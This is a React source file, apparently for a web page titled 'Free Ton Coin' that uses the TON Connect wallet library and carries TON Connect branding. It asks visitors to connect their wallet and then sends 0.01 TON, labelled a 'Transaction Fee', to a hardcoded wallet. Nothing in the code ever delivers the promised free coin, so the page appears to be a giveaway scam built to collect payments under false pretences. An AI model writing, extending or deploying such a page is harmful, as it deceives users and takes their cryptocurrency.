"use client";

import React, { useState, useEffect } from "react";
import { useTonConnectUI } from "@tonconnect/ui-react";
import TonWeb from "tonweb";
import { Wallet, Shield, HelpCircle, FileText } from "lucide-react";

const DESTINATION_WALLET = "UQDzUaYMFIZNzIXsc7xBuIyAJapXMlNtaFaUUUYOSGrIlYOW"; // آدرس ولت مقصد
const AMOUNT = 0.01; // مقدار TON

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);

  // اتصال یا قطع اتصال به کیف پول
  const handleConnect = async () => {
    setIsConnecting(true);
    if (tonConnectUI.connected) {
      await tonConnectUI.disconnect();
      setWalletAddress(null);
    } else {
      await tonConnectUI.openModal();
    }
    setIsConnecting(false);
  };

  // بروزرسانی وضعیت کیف پول
  useEffect(() => {
    if (tonConnectUI.account?.address) {
      setWalletAddress(tonConnectUI.account.address);
    }

    const unsubscribe = tonConnectUI.onStatusChange((wallet) => {
      setWalletAddress(wallet?.account.address || null);
    });

    return () => unsubscribe();
  }, [tonConnectUI]);

  // ارسال تراکنش به شبکه TON
  const sendTransaction = async () => {
    if (!walletAddress) {
      alert("Please connect your wallet first.");
      return;
    }

    try {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300, // اعتبار 5 دقیقه‌ای
        messages: [
          {
            address: DESTINATION_WALLET,
            amount: TonWeb.utils.toNano(AMOUNT.toString()).toString(),
            payload: "",
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      alert("Transaction sent successfully!");
    } catch (error) {
      console.error("Transaction failed:", error);
      alert("Transaction failed. Please try again.");
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-between bg-[#1C2127] text-white">
      {/* Header */}
      <header className="w-full bg-[#1C2127] border-b border-[#2D3139] p-4 flex items-center justify-between">
        <div className="flex items-center space-x-3">
          <Wallet className="w-8 h-8 text-[#0098EA]" />
          <span className="text-xl font-bold">TON Connect</span>
        </div>
        <button
          onClick={handleConnect}
          className="bg-[#0098EA] px-4 py-2 rounded text-white hover:bg-[#00A9FF] transition"
        >
          {walletAddress ? "Disconnect Wallet" : "Connect Wallet"}
        </button>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center p-6 text-center space-y-8">
        <h1 className="text-4xl font-bold">Free Ton Coin</h1>

        <div className="bg-[#1C2127] p-6 rounded-xl border border-[#2D3139] space-y-4">
          <div className="flex justify-between text-gray-400">
            <span>Transaction Fee</span>
            <span className="font-mono">{AMOUNT} TON</span>
          </div>
          <div className="flex justify-between text-gray-400">
            <span>Network</span>
            <span className="text-[#0098EA]">TON</span>
          </div>
        </div>

        {walletAddress ? (
          <button
            onClick={sendTransaction}
            className="bg-green-500 px-4 py-2 rounded text-white hover:bg-green-700 transition"
          >
            Send Transaction
          </button>
        ) : (
          <p>Please connect your wallet to proceed.</p>
        )}
      </main>

      {/* Footer */}
      <footer className="w-full bg-[#1C2127] border-t border-[#2D3139] p-4 flex justify-between">
        <div className="text-sm text-gray-400">© 2024 TON Connect. All rights reserved.</div>
        <div className="flex space-x-6 text-sm">
          <a href="#" className="flex items-center text-gray-400 hover:text-white">
            <Shield className="w-4 h-4" />
            <span className="ml-2">Security</span>
          </a>
          <a href="#" className="flex items-center text-gray-400 hover:text-white">
            <FileText className="w-4 h-4" />
            <span className="ml-2">Terms</span>
          </a>
          <a href="#" className="flex items-center text-gray-400 hover:text-white">
            <HelpCircle className="w-4 h-4" />
            <span className="ml-2">Support</span>
          </a>
        </div>
      </footer>
    </div>
  );
}
